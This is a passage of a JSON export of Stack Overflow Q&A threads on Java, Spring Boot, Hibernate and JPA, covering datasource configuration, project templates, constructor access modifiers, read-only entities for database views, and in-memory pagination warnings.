@Value(&quot;${oracle.custom.some-of-setting}&quot;)\n    private String SomeOfSetting;\n\n    @Bean\n    @ConfigurationProperties(prefix = &quot;oracle.datasource&quot;)\n    public HikariDataSource dataSourceOracle() throws Exception {\n        HikariDataSource hikariDataSource = new HikariDataSource();\n\n        if (useCustomOracle){\n            hikariDataSource.SetSomeOfSetting(SomeOfSetting);\n        }\n\n        return hikariDataSource;\n    }\n</code></pre>\n<p>application.yml (this values(oracle and hive) can read from HiveConfig.class via @Value)</p>\n<pre><code>oracle:\n  custom:\n    use:true\n    some-of-setting: str\nhive:\n  custom:\n    use:true\n    some-of-setting: str\n\n</code></pre>\n"},{"tags":["java","spring","spring-boot","spring-mvc","web-applications"],"answers":[{"tags":[],"owner":{"account_id":19460464,"reputation":43,"user_id":14234891,"display_name":"Ionathan Ardelean"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1611174213,"creation_date":1611174213,"answer_id":65817088,"question_id":65816961,"body_markdown":"If you want to generate an app with spring boot + angular/reactjs/vuejs I think that the best solution by far at this moment is JHipster.\r\n","title":"Where can I find a minimal spring boot boilerplate web app with backend and frontend?","body":"<p>If you want to generate an app with spring boot + angular/reactjs/vuejs I think that the best solution by far at this moment is JHipster.</p>\n"},{"tags":[],"owner":{"account_id":322981,"reputation":310745,"user_id":642706,"accept_rate":58,"display_name":"Basil Bourque"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1642478545,"creation_date":1611179995,"answer_id":65818305,"question_id":65816961,"body_markdown":"[Vaadin Flow][1] is a [GUI][2] framework for web apps driven through [Spring Boot][3]. (Alternatively, you can base your Vaadin app on [Jakarta EE][5] or plain [Jakarta Servlet][4].)\r\n\r\nA customized project template can be generated from their [&quot;Start building&quot; web page][6].\r\n\r\nYou can manage your Vaadin project with either [Maven][7] or [Gradle][8].\r\n\r\n\r\n  [1]: https://en.wikipedia.org/wiki/Vaadin\r\n  [2]: https://en.wikipedia.org/wiki/Graphical_user_interface\r\n  [3]: https://en.wikipedia.org/wiki/Spring_Framework#Spring_Boot\r\n  [4]: https://en.wikipedia.org/wiki/Jakarta_Servlet\r\n  [5]: https://en.wikipedia.org/wiki/Jakarta_EE\r\n  [6]: https://vaadin.com/start\r\n  [7]: https://en.wikipedia.org/wiki/Apache_Maven\r\n  [8]: https://en.wikipedia.org/wiki/Gradle","title":"Where can I find a minimal spring boot boilerplate web app with backend and frontend?","body":"<p><a href=\"https://en.wikipedia.org/wiki/Vaadin\" rel=\"nofollow noreferrer\">Vaadin Flow</a> is a <a href=\"https://en.wikipedia.org/wiki/Graphical_user_interface\" rel=\"nofollow noreferrer\">GUI</a> framework for web apps driven through <a href=\"https://en.wikipedia.org/wiki/Spring_Framework#Spring_Boot\" rel=\"nofollow noreferrer\">Spring Boot</a>. (Alternatively, you can base your Vaadin app on <a href=\"https://en.wikipedia.org/wiki/Jakarta_EE\" rel=\"nofollow noreferrer\">Jakarta EE</a> or plain <a href=\"https://en.wikipedia.org/wiki/Jakarta_Servlet\" rel=\"nofollow noreferrer\">Jakarta Servlet</a>.)</p>\n<p>A customized project template can be generated from their <a href=\"https://vaadin.com/start\" rel=\"nofollow noreferrer\">&quot;Start building&quot; web page</a>.</p>\n<p>You can manage your Vaadin project with either <a href=\"https://en.wikipedia.org/wiki/Apache_Maven\" rel=\"nofollow noreferrer\">Maven</a> or <a href=\"https://en.wikipedia.org/wiki/Gradle\" rel=\"nofollow noreferrer\">Gradle</a>.</p>\n"}],"owner":{"account_id":8698919,"reputation":834,"user_id":6509472,"display_name":"Anant_Kumar"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":380,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":2,"score":1,"last_activity_date":1642478545,"creation_date":1611173663,"question_id":65816961,"body_markdown":"I want a barebone template project for a webapp implemented using *spring boot* (frontend + backend APIs - DB)\r\n\r\nI referred this [VS Code&#39;s doc](https://code.visualstudio.com/docs/java/java-webapp) for working with Java. It worked fine but it is not a complete webapp.\r\n\r\nThanks in advance!","title":"Where can I find a minimal spring boot boilerplate web app with backend and frontend?","body":"<p>I want a barebone template project for a webapp implemented using <em>spring boot</em> (frontend + backend APIs - DB)</p>\n<p>I referred this <a href=\"https://code.visualstudio.com/docs/java/java-webapp\" rel=\"nofollow noreferrer\">VS Code's doc</a> for working with Java. It worked fine but it is not a complete webapp.</p>\n<p>Thanks in advance!</p>\n"},{"tags":["java","constructor","public"],"comments":[{"owner":{"account_id":1682228,"reputation":3337,"user_id":2011421,"accept_rate":88,"display_name":"Sergio"},"score":2,"creation_date":1409151373,"post_id":25530382,"comment_id":39859269,"body_markdown":"Surely &quot;second&quot; is in the same package as &quot;first&quot;. Remember: Default access (i.e No modifier) is visible to classes in the same package. And, the Other class is in other package different from first.","body":"Surely &quot;second&quot; is in the same package as &quot;first&quot;. Remember: Default access (i.e No modifier) is visible to classes in the same package. And, the Other class is in other package different from first."},{"owner":{"account_id":144312,"reputation":5528,"user_id":353268,"accept_rate":86,"display_name":"mariosangiorgio"},"score":0,"creation_date":1409151725,"post_id":25530382,"comment_id":39859525,"body_markdown":"In what packages are `First`, `Second` and the class(es) where you try to instantiate them?","body":"In what packages are <code>First</code>, <code>Second</code> and the class(es) where you try to instantiate them?"},{"owner":{"account_id":284109,"reputation":47153,"user_id":581994,"accept_rate":57,"display_name":"Hot Licks"},"score":1,"creation_date":1409152584,"post_id":25530382,"comment_id":39860132,"body_markdown":"&quot;Access modifiers&quot; in Java are a bit confusing and not especially &quot;regular&quot;.  There&#39;s `public`, `private`, `protected`, and &quot;no modifier&quot;.  `public` can be accessed from anywhere, `private` only from within the same class, `protected` from a subclass, and &quot;no modifier&quot; from any class in the same &quot;package&quot;.","body":"&quot;Access modifiers&quot; in Java are a bit confusing and not especially &quot;regular&quot;.  There&#39;s <code>public</code>, <code>private</code>, <code>protected</code>, and &quot;no modifier&quot;.  <code>public</code> can be accessed from anywhere, <code>private</code> only from within the same class, <code>protected</code> from a subclass, and &quot;no modifier&quot; from any class in the same &quot;package&quot;."}],"answers":[{"tags":[],"owner":{"account_id":4943423,"reputation":780,"user_id":3979528,"display_name":"J4v4"},"down_vote_count":0,"up_vote_count":14,"is_accepted":true,"score":14,"last_activity_date":1409151270,"creation_date":1409151270,"answer_id":25530446,"question_id":25530382,"body_markdown":"No access modifier for your constructor makes it &lt;b&gt;package private&lt;/b&gt;.\r\nAssuming that First and Second are in the same package, you can call Second&#39;s constructors from first.\r\nAnother class from another package, however, cannot access any of the constructors.","title":"&quot;The constructor is not visible&quot; error","body":"<p>No access modifier for your constructor makes it <b>package private</b>.\nAssuming that First and Second are in the same package, you can call Second's constructors from first.\nAnother class from another package, however, cannot access any of the constructors.</p>\n"},{"tags":[],"owner":{"account_id":2177522,"reputation":120796,"user_id":1927832,"accept_rate":49,"display_name":"Suresh Atta"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1409151689,"creation_date":1409151375,"answer_id":25530502,"question_id":25530382,"body_markdown":"Since you are not mentined any modifier the access modifier is now **default**, that means **it is visible only within its own package** \r\n\r\nIf you try to use it out side the package, you&#39;ll face the current error.\r\n\r\nTry to read :https://stackoverflow.com/questions/16164902/what-is-the-default-access-modifier-in-java\r\n\r\nIf you did&#39;nt get understood what @BackSlash is commenting, check the below link\r\n\r\nProblem with : https://stackoverflow.com/questions/20814209/calling-a-method-from-a-superclass","title":"&quot;The constructor is not visible&quot; error","body":"<p>Since you are not mentined any modifier the access modifier is now <strong>default</strong>, that means <strong>it is visible only within its own package</strong> </p>\n\n<p>If you try to use it out side the package, you'll face the current error.</p>\n\n<p>Try to read :<a href=\"https://stackoverflow.com/questions/16164902/what-is-the-default-access-modifier-in-java\">What is the default access modifier in Java?</a></p>\n\n<p>If you did'nt get understood what @BackSlash is commenting, check the below link</p>\n\n<p>Problem with : <a href=\"https://stackoverflow.com/questions/20814209/calling-a-method-from-a-superclass\">Calling a method from a superclass</a></p>\n"},{"tags":[],"owner":{"account_id":2436112,"reputation":5684,"user_id":2125973,"accept_rate":38,"display_name":"Thusitha Thilina Dayaratne"},"down_vote_count":0,"up_vote_count":7,"is_accepted":false,"score":7,"last_activity_date":1409151441,"creation_date":1409151441,"answer_id":25530514,"question_id":25530382,"body_markdown":"Your class must be in 2 packages. If you don&#39;t mention any explicit access modifier Java will consider them as default access modifier. Then you **can only access them through the same package only**.\r\n\r\nAccess Modifiers (From least access to highest access)\r\n \r\n\r\n 1. **private** - Only within same class\r\n 2. **default** - Only within same package\r\n 3. **protected** - same package + children classes in other packages\r\n 4. **public** - From anywhere","title":"&quot;The constructor is not visible&quot; error","body":"<p>Your class must be in 2 packages. If you don't mention any explicit access modifier Java will consider them as default access modifier. Then you <strong>can only access them through the same package only</strong>.</p>\n\n<p>Access Modifiers (From least access to highest access)</p>\n\n<ol>\n<li><strong>private</strong> - Only within same class</li>\n<li><strong>default</strong> - Only within same package</li>\n<li><strong>protected</strong> - same package + children classes in other packages</li>\n<li><strong>public</strong> - From anywhere</li>\n</ol>\n"},{"tags":[],"owner":{"account_id":21190157,"reputation":19,"user_id":16139471,"display_name":"PietroSupport"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642477339,"creation_date":1642477339,"answer_id":70750037,"question_id":25530382,"body_markdown":"just make your constructor **public**","title":"&quot;The constructor is not visible&quot; error","body":"<p>just make your constructor <strong>public</strong></p>\n"}],"owner":{"account_id":2085211,"reputation":1024,"user_id":1856362,"accept_rate":80,"display_name":"BnJ"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":63546,"favorite_count":0,"down_vote_count":1,"up_vote_count":7,"accepted_answer_id":25530446,"answer_count":4,"score":6,"last_activity_date":1642477339,"creation_date":1409151132,"question_id":25530382,"body_markdown":"I have two classes :\r\n\r\nFirst, with one constructor :\r\n\r\n    public class First {\r\n    \t\r\n    \tFirst (ObjectA myObjectA) {\r\n    \t\t//do stuff\r\n    \t}\r\n    }\r\n\r\nAnd Second, with two constructors :\r\n\r\n    public class Second {\r\n    \t\r\n    \tSecond (ObjectB myObjectB) {\r\n    \t\t//do something...\r\n    \t}\r\n    \t\r\n    \tSecond (ObjectC myObjectC) {\r\n    \t\t//do something else...\r\n    \t}\r\n    }\r\n\r\nWhen I want to instantiate my `First` class, Eclipse generates me an error (&quot;The constructor is not visible&quot;), I have to add `public` to the constructor of `First` :\r\n\r\n    First first = new First(myObject); //Error : &quot;The constructor is not visble&quot;\r\n\r\nBut when I instantiate my `Second` class, I have no error :\r\n\r\n    Second second = new Second(myObjectC); //No error...\r\n\r\nNotes: I instantiate `First` in an other class, but I instantiate `Second` in `First`. `First` and `Second` are in the same package.\r\n\r\nCan you explain me why ?","title":"&quot;The constructor is not visible&quot; error","body":"<p>I have two classes :</p>\n\n<p>First, with one constructor :</p>\n\n<pre><code>public class First {\n\n    First (ObjectA myObjectA) {\n        //do stuff\n    }\n}\n</code></pre>\n\n<p>And Second, with two constructors :</p>\n\n<pre><code>public class Second {\n\n    Second (ObjectB myObjectB) {\n        //do something...\n    }\n\n    Second (ObjectC myObjectC) {\n        //do something else...\n    }\n}\n</code></pre>\n\n<p>When I want to instantiate my <code>First</code> class, Eclipse generates me an error (\"The constructor is not visible\"), I have to add <code>public</code> to the constructor of <code>First</code> :</p>\n\n<pre><code>First first = new First(myObject); //Error : \"The constructor is not visble\"\n</code></pre>\n\n<p>But when I instantiate my <code>Second</code> class, I have no error :</p>\n\n<pre><code>Second second = new Second(myObjectC); //No error...\n</code></pre>\n\n<p>Notes: I instantiate <code>First</code> in an other class, but I instantiate <code>Second</code> in <code>First</code>. <code>First</code> and <code>Second</code> are in the same package.</p>\n\n<p>Can you explain me why ?</p>\n"},{"tags":["java","sql","jpa"],"answers":[{"tags":[],"owner":{"account_id":13125144,"reputation":163,"user_id":9481374,"display_name":"Varadharajan Raghavendran"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642477071,"creation_date":1642477071,"answer_id":70750015,"question_id":70749485,"body_markdown":"To answer your question on what is the recommended way (other than using a nativeQuery) to gain accessibility to your view as well as maintain your existing accessibility to the user table, the best possibility is to create another entity something like the one below,\r\n\r\n    import javax.persistence.*;\r\n    \r\n    @Entity\r\n    @Immutable\r\n    public class UserSubscriptionLatest implements java.io.Serializable {\r\n    \r\n      @Id\r\n      @GeneratedValue(strategy = GenerationType.IDENTITY)\r\n      @Column(name = &quot;id&quot;, nullable = false, updatable = false, insertable = false)\r\n      private Integer id;\r\n    \r\n      @Column(name = &quot;user_id&quot;, nullable = false)\r\n      private Integer userId;\r\n    \r\n      @Column(name = &quot;data&quot;, nullable = true, length = 2000)\r\n      private String data;\r\n    \r\n      @Temporal(TemporalType.TIMESTAMP)\r\n      @Column(name = &quot;created_at&quot;, nullable = false, updatable = false, insertable = false)\r\n      private java.time.LocalDateTime createdAt;\r\n    \r\n      @Temporal(TemporalType.TIMESTAMP)\r\n      @Column(name = &quot;updated_at&quot;, nullable = false, updatable = false, insertable = false)\r\n      private java.time.LocalDateTime updatedAt;\r\n    \r\n    }\r\n    \r\nMaking your entity class immutable is the most important step to working with database views in Spring Data JPA. Based on this mapping, Hibernate will ensure that your application doesn’t perform any write operations on the view. To make your persistence layer easier to use, you should take this one step further and also exclude all methods from your repository that persist, update or remove an entity.\r\n\r\nThen create a readOnlyRepository defining an interface that extends the Repository interface and copying a few method definitions from Spring Data JPA’s standard repositories like the one below\r\n\r\n    @NoRepositoryBean\r\n    public interface ReadOnlyRepository&lt;T, ID&gt; extends Repository&lt;T, ID&gt; {\r\n     \r\n        List&lt;T&gt; findAll();\r\n     \r\n        List&lt;T&gt; findAll(Sort sort);\r\n     \r\n        Page&lt;T&gt; findAll(Pageable pageable);\r\n     \r\n        Optional&lt;T&gt; findById(ID id);\r\n         \r\n        long count();\r\n    }\r\n\r\nThen create your JPArepository by extending the readOnlyRepository that we just created, this ensures that your repository is accessible for readOnly purposes and also tells the hibernate to eschew any checks pertaining to write/update\r\n\r\n    public interface UserSubscriptionLatestRepository extends  ReadOnlyRepository&lt;UserSubscriptionLatest, Integer&gt; {    \r\n    List&lt;UserSubscriptionLatest&gt; findById();\r\n    }\r\n\r\nHope I had answered your question","title":"JPA entity with extra supportive View","body":"<p>To answer your question on what is the recommended way (other than using a nativeQuery) to gain accessibility to your view as well as maintain your existing accessibility to the user table, the best possibility is to create another entity something like the one below,</p>\n<pre><code>import javax.persistence.*;\n\n@Entity\n@Immutable\npublic class UserSubscriptionLatest implements java.io.Serializable {\n\n  @Id\n  @GeneratedValue(strategy = GenerationType.IDENTITY)\n  @Column(name = &quot;id&quot;, nullable = false, updatable = false, insertable = false)\n  private Integer id;\n\n  @Column(name = &quot;user_id&quot;, nullable = false)\n  private Integer userId;\n\n  @Column(name = &quot;data&quot;, nullable = true, length = 2000)\n  private String data;\n\n  @Temporal(TemporalType.TIMESTAMP)\n  @Column(name = &quot;created_at&quot;, nullable = false, updatable = false, insertable = false)\n  private java.time.LocalDateTime createdAt;\n\n  @Temporal(TemporalType.TIMESTAMP)\n  @Column(name = &quot;updated_at&quot;, nullable = false, updatable = false, insertable = false)\n  private java.time.LocalDateTime updatedAt;\n\n}\n</code></pre>\n<p>Making your entity class immutable is the most important step to working with database views in Spring Data JPA. Based on this mapping, Hibernate will ensure that your application doesn’t perform any write operations on the view. To make your persistence layer easier to use, you should take this one step further and also exclude all methods from your repository that persist, update or remove an entity.</p>\n<p>Then create a readOnlyRepository defining an interface that extends the Repository interface and copying a few method definitions from Spring Data JPA’s standard repositories like the one below</p>\n<pre><code>@NoRepositoryBean\npublic interface ReadOnlyRepository&lt;T, ID&gt; extends Repository&lt;T, ID&gt; {\n \n    List&lt;T&gt; findAll();\n \n    List&lt;T&gt; findAll(Sort sort);\n \n    Page&lt;T&gt; findAll(Pageable pageable);\n \n    Optional&lt;T&gt; findById(ID id);\n     \n    long count();\n}\n</code></pre>\n<p>Then create your JPArepository by extending the readOnlyRepository that we just created, this ensures that your repository is accessible for readOnly purposes and also tells the hibernate to eschew any checks pertaining to write/update</p>\n<pre><code>public interface UserSubscriptionLatestRepository extends  ReadOnlyRepository&lt;UserSubscriptionLatest, Integer&gt; {    \nList&lt;UserSubscriptionLatest&gt; findById();\n}\n</code></pre>\n<p>Hope I had answered your question</p>\n"}],"owner":{"account_id":7475898,"reputation":133,"user_id":5682352,"display_name":"Pin Gu"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":182,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1642477071,"creation_date":1642470892,"question_id":70749485,"body_markdown":"Given table schema as below (this is mysql syntax, but does not matter)\r\n\r\n```sql\r\n-- base table keeping all subscription data\r\nCREATE TABLE user_subscription (\r\n  id         INTEGER       NOT NULL AUTO_INCREMENT PRIMARY KEY,\r\n  user_id    INTEGER       NOT NULL,\r\n  data       VARCHAR(2000) NULL,\r\n  created_at DATETIME      NOT NULL DEFAULT CURRENT_TIMESTAMP,\r\n  updated_at DATETIME      NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP\r\n);\r\n\r\n-- supportive view focusing on every user&#39;s latest row\r\nCREATE VIEW user_subscription_latest AS\r\n  SELECT s1.*\r\n  FROM user_subscription s1\r\n  LEFT JOIN user_subscription s2\r\n    ON s2.user_id = s1.user_id AND s2.updated_at &gt; s1.updated_at\r\n  WHERE s2.id IS NULL;\r\n```\r\n\r\nAnd I have following entity class for base table `user_subscription`\r\n\r\n```java\r\nimport javax.persistence.*;\r\n\r\n@Entity\r\n@Table(name = &quot;user_subscription&quot;)\r\npublic class UserSubscription implements java.io.Serializable {\r\n\r\n  @Id\r\n  @GeneratedValue(strategy = GenerationType.IDENTITY)\r\n  @Column(name = &quot;id&quot;, nullable = false, updatable = false, insertable = false)\r\n  private Integer id;\r\n\r\n  @Column(name = &quot;user_id&quot;, nullable = false)\r\n  private Integer userId;\r\n\r\n  @Column(name = &quot;data&quot;, nullable = true, length = 2000)\r\n  private String data;\r\n\r\n  @Temporal(TemporalType.TIMESTAMP)\r\n  @Column(name = &quot;created_at&quot;, nullable = false, updatable = false, insertable = false)\r\n  private java.time.LocalDateTime createdAt;\r\n\r\n  @Temporal(TemporalType.TIMESTAMP)\r\n  @Column(name = &quot;updated_at&quot;, nullable = false, updatable = false, insertable = false)\r\n  private java.time.LocalDateTime updatedAt;\r\n\r\n}\r\n```\r\n\r\nAnd following Spring Data JPA repository (still does not matter. it can be any JPA scenario)\r\n\r\n```java\r\nimport org.springframework.data.jpa.repository.JpaRepository;\r\nimport org.springframework.data.jpa.repository.Query;\r\n\r\npublic interface UserSubscriptionRepository extends JpaRepository&lt;UserSubscription, Integer&gt; {\r\n\r\n  // TODO How can I achieve this without using nativeQuery?\r\n  @Query(value = &quot;SELECT * FROM user_subscription_latest&quot;, nativeQuery = true)\r\n  java.util.List&lt;UserSubscription&gt; findLatest();\r\n\r\n}\r\n```\r\n\r\nSince view `user_subscription_latest` is subset of `user_subscription`, they are interchangeable, but I have no idea how to put them together.\r\n\r\nMy question is what is the correct/preferred way to design the JPA entity so that I can take advantage of supportive view `user_subscription_latest` on query while keeping accessibility to base table `user_subscription`, without nativeQuery?\r\n","title":"JPA entity with extra supportive View","body":"<p>Given table schema as below (this is mysql syntax, but does not matter)</p>\n<pre class=\"lang-sql prettyprint-override\"><code>-- base table keeping all subscription data\nCREATE TABLE user_subscription (\n  id         INTEGER       NOT NULL AUTO_INCREMENT PRIMARY KEY,\n  user_id    INTEGER       NOT NULL,\n  data       VARCHAR(2000) NULL,\n  created_at DATETIME      NOT NULL DEFAULT CURRENT_TIMESTAMP,\n  updated_at DATETIME      NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP\n);\n\n-- supportive view focusing on every user's latest row\nCREATE VIEW user_subscription_latest AS\n  SELECT s1.*\n  FROM user_subscription s1\n  LEFT JOIN user_subscription s2\n    ON s2.user_id = s1.user_id AND s2.updated_at &gt; s1.updated_at\n  WHERE s2.id IS NULL;\n</code></pre>\n<p>And I have following entity class for base table <code>user_subscription</code></p>\n<pre class=\"lang-java prettyprint-override\"><code>import javax.persistence.*;\n\n@Entity\n@Table(name = &quot;user_subscription&quot;)\npublic class UserSubscription implements java.io.Serializable {\n\n  @Id\n  @GeneratedValue(strategy = GenerationType.IDENTITY)\n  @Column(name = &quot;id&quot;, nullable = false, updatable = false, insertable = false)\n  private Integer id;\n\n  @Column(name = &quot;user_id&quot;, nullable = false)\n  private Integer userId;\n\n  @Column(name = &quot;data&quot;, nullable = true, length = 2000)\n  private String data;\n\n  @Temporal(TemporalType.TIMESTAMP)\n  @Column(name = &quot;created_at&quot;, nullable = false, updatable = false, insertable = false)\n  private java.time.LocalDateTime createdAt;\n\n  @Temporal(TemporalType.TIMESTAMP)\n  @Column(name = &quot;updated_at&quot;, nullable = false, updatable = false, insertable = false)\n  private java.time.LocalDateTime updatedAt;\n\n}\n</code></pre>\n<p>And following Spring Data JPA repository (still does not matter. it can be any JPA scenario)</p>\n<pre class=\"lang-java prettyprint-override\"><code>import org.springframework.data.jpa.repository.JpaRepository;\nimport org.springframework.data.jpa.repository.Query;\n\npublic interface UserSubscriptionRepository extends JpaRepository&lt;UserSubscription, Integer&gt; {\n\n  // TODO How can I achieve this without using nativeQuery?\n  @Query(value = &quot;SELECT * FROM user_subscription_latest&quot;, nativeQuery = true)\n  java.util.List&lt;UserSubscription&gt; findLatest();\n\n}\n</code></pre>\n<p>Since view <code>user_subscription_latest</code> is subset of <code>user_subscription</code>, they are interchangeable, but I have no idea how to put them together.</p>\n<p>My question is what is the correct/preferred way to design the JPA entity so that I can take advantage of supportive view <code>user_subscription_latest</code> on query while keeping accessibility to base table <code>user_subscription</code>, without nativeQuery?</p>\n"},{"tags":["java","hibernate","jpa","jpql","ejb-3.0"],"comments":[{"owner":{"account_id":350230,"reputation":6382,"user_id":685962,"display_name":"d1e"},"score":0,"creation_date":1342006775,"post_id":11431670,"comment_id":15081009,"body_markdown":"Please add code where you build and execute query.","body":"Please add code where you build and execute query."},{"owner":{"account_id":983620,"reputation":7190,"user_id":1142530,"accept_rate":46,"display_name":"Gnik"},"score":0,"creation_date":1342009540,"post_id":11431670,"comment_id":15082256,"body_markdown":"JMelnik, Please see my edited question with Code and query.","body":"JMelnik, Please see my edited question with Code and query."},{"owner":{"account_id":350230,"reputation":6382,"user_id":685962,"display_name":"d1e"},"score":0,"creation_date":1342009711,"post_id":11431670,"comment_id":15082353,"body_markdown":"Query also, where you set your maxResult parameters.","body":"Query also, where you set your maxResult parameters."},{"owner":{"account_id":983620,"reputation":7190,"user_id":1142530,"accept_rate":46,"display_name":"Gnik"},"score":0,"creation_date":1342012668,"post_id":11431670,"comment_id":15083696,"body_markdown":"This is the code and query in my application. I don&#39;t set maxResult manually.","body":"This is the code and query in my application. I don&#39;t set maxResult manually."},{"owner":{"account_id":1532531,"reputation":36089,"user_id":1429387,"accept_rate":63,"display_name":"naXa stands with Ukraine"},"score":2,"creation_date":1505386172,"post_id":11431670,"comment_id":79396669,"body_markdown":"This means that Hibernate is fetching everything and then **trying to apply the first/max result restrictions in memory**. This may seem undesirable to you. Here&#39;s what the JPA spec has to say about this kind of interaction: &quot;The effect of applying `setMaxResults` or `setFirstResult` to a query involving fetch joins over collections is undefined. ([JPA &quot;Enterprise JavaBeans 3.0, Final Release&quot;](http://download.oracle.com/otndocs/jcp/ejb-3_0-fr-eval-oth-JSpec/), Kapitel 3.6.1 Query Interface)&quot;","body":"This means that Hibernate is fetching everything and then <b>trying to apply the first/max result restrictions in memory</b>. This may seem undesirable to you. Here&#39;s what the JPA spec has to say about this kind of interaction: &quot;The effect of applying <code>setMaxResults</code> or <code>setFirstResult</code> to a query involving fetch joins over collections is undefined. (<a href=\"http://download.oracle.com/otndocs/jcp/ejb-3_0-fr-eval-oth-JSpec/\" rel=\"nofollow noreferrer\">JPA &quot;Enterprise JavaBeans 3.0, Final Release&quot;</a>, Kapitel 3.6.1 Query Interface)&quot;"},{"owner":{"account_id":2813489,"reputation":509,"user_id":3686087,"display_name":"msmaromi"},"score":0,"creation_date":1592466774,"post_id":11431670,"comment_id":110436776,"body_markdown":"@Prince how you finally solve the problem? mind sharing with me, because I have the exact isisue","body":"@Prince how you finally solve the problem? mind sharing with me, because I have the exact isisue"}],"answers":[{"tags":[],"owner":{"account_id":40939,"reputation":41525,"user_id":118846,"display_name":"Mikko Maunu"},"down_vote_count":1,"up_vote_count":22,"is_accepted":true,"score":21,"last_activity_date":1342007104,"creation_date":1342007104,"answer_id":11431936,"question_id":11431670,"body_markdown":"Reason for this warning is that when fetch join is used, order in result sets is defined only by ID of selected entity (and not by join fetched).\r\n\r\nIf this sorting in memory is causing problems, do not use firsResult/maxResults with JOIN FETCH.","title":"How can I avoid the Warning &quot;firstResult/maxResults specified with collection fetch; applying in memory!&quot; when using Hibernate?","body":"<p>Reason for this warning is that when fetch join is used, order in result sets is defined only by ID of selected entity (and not by join fetched).</p>\n\n<p>If this sorting in memory is causing problems, do not use firsResult/maxResults with JOIN FETCH.</p>\n"},{"tags":[],"owner":{"account_id":477060,"reputation":301,"user_id":888320,"display_name":"Lucas"},"down_vote_count":1,"up_vote_count":22,"is_accepted":false,"score":21,"last_activity_date":1344429959,"creation_date":1344429959,"answer_id":11864835,"question_id":11431670,"body_markdown":"To avoid this WARNING you have to change the call `getSingleResult` to \r\n`getResultList().get(0)`","title":"How can I avoid the Warning &quot;firstResult/maxResults specified with collection fetch; applying in memory!&quot; when using Hibernate?","body":"<p>To avoid this WARNING you have to change the call <code>getSingleResult</code> to \n<code>getResultList().get(0)</code></p>\n"},{"tags":[],"owner":{"account_id":2606286,"reputation":683,"user_id":2257397,"accept_rate":38,"display_name":"Benjamin Fuentes"},"down_vote_count":1,"up_vote_count":2,"is_accepted":false,"score":1,"last_activity_date":1387453330,"creation_date":1387453330,"answer_id":20680846,"question_id":11431670,"body_markdown":"the problem is you will get cartesian product doing JOIN. The offset will cut your recordset without looking if you are still on same root identity class ","title":"How can I avoid the Warning &quot;firstResult/maxResults specified with collection fetch; applying in memory!&quot; when using Hibernate?","body":"<p>the problem is you will get cartesian product doing JOIN. The offset will cut your recordset without looking if you are still on same root identity class </p>\n"},{"tags":[],"owner":{"account_id":3673241,"reputation":1185,"user_id":3059896,"display_name":"Shehan Simen"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1402534396,"creation_date":1402534396,"answer_id":24174922,"question_id":11431670,"body_markdown":"I guess the emp has many departments which is a One to Many relationship. Hibernate will fetch many rows for this query with fetched department records. So the order of result set can not be decided until it has really fetch the results to the memory. So the pagination will be done in memory.\r\n\r\nIf you do not want to fetch the departments with emp, but still want to do some query based on the department, you can achieve the result with out warning (without doing ordering in the memory). For that simply you have to remove the &quot;fetch&quot; clause. So something like as follows:\r\n\r\nQUERY = &quot;from employee as emp left join emp.salary sal left join emp.department dep where emp.id = :id and dep.name = &#39;testing&#39; and sal.salary &gt; 5000 &quot;\r\n\r\n","title":"How can I avoid the Warning &quot;firstResult/maxResults specified with collection fetch; applying in memory!&quot; when using Hibernate?","body":"<p>I guess the emp has many departments which is a One to Many relationship. Hibernate will fetch many rows for this query with fetched department records. So the order of result set can not be decided until it has really fetch the results to the memory. So the pagination will be done in memory.</p>\n\n<p>If you do not want to fetch the departments with emp, but still want to do some query based on the department, you can achieve the result with out warning (without doing ordering in the memory). For that simply you have to remove the \"fetch\" clause. So something like as follows:</p>\n\n<p>QUERY = \"from employee as emp left join emp.salary sal left join emp.department dep where emp.id = :id and dep.name = 'testing' and sal.salary > 5000 \"</p>\n"},{"tags":[],"owner":{"account_id":1012936,"reputation":145168,"user_id":1025118,"accept_rate":100,"display_name":"Vlad Mihalcea"},"down_vote_count":0,"up_vote_count":49,"is_accepted":false,"score":49,"last_activity_date":1610184526,"creation_date":1505300088,"answer_id":46195656,"question_id":11431670,"body_markdown":"Although you are getting valid results, the SQL query fetches all data and it&#39;s not as efficient as it should.\r\n\r\nSo, you have two options.\r\n\r\nFixing the issue with two SQL queries that can fetch entities in read-write mode\r\n------------------------------------------------------------------------\r\n\r\nThe easiest way to fix this issue is to execute two queries:\r\n\r\n. The first query will fetch the root entity identifiers matching the provided filtering criteria.\r\n. The second query will use the previously extracted root entity identifiers to fetch the parent and the child entities.\r\n\r\nThis approach is very easy to implement and looks as follows:\r\n\r\n    List&lt;Long&gt; postIds = entityManager\r\n    .createQuery(\r\n        &quot;select p.id &quot; +\r\n        &quot;from Post p &quot; +\r\n        &quot;where p.title like :titlePattern &quot; +\r\n        &quot;order by p.createdOn&quot;, Long.class)\r\n    .setParameter(\r\n        &quot;titlePattern&quot;,\r\n        &quot;High-Performance Java Persistence %&quot;\r\n    )\r\n    .setMaxResults(5)\r\n    .getResultList();\r\n     \r\n    List&lt;Post&gt; posts = entityManager\r\n    .createQuery(\r\n        &quot;select distinct p &quot; +\r\n        &quot;from Post p &quot; +\r\n        &quot;left join fetch p.comments &quot; +\r\n        &quot;where p.id in (:postIds) &quot;  +\r\n        &quot;order by p.createdOn&quot;, Post.class)\r\n    .setParameter(&quot;postIds&quot;, postIds)\r\n    .setHint(\r\n        &quot;hibernate.query.passDistinctThrough&quot;, \r\n        false\r\n    )\r\n    .getResultList();\r\n\r\nFixing the issue with one SQL query that can only fetch entities in read-only 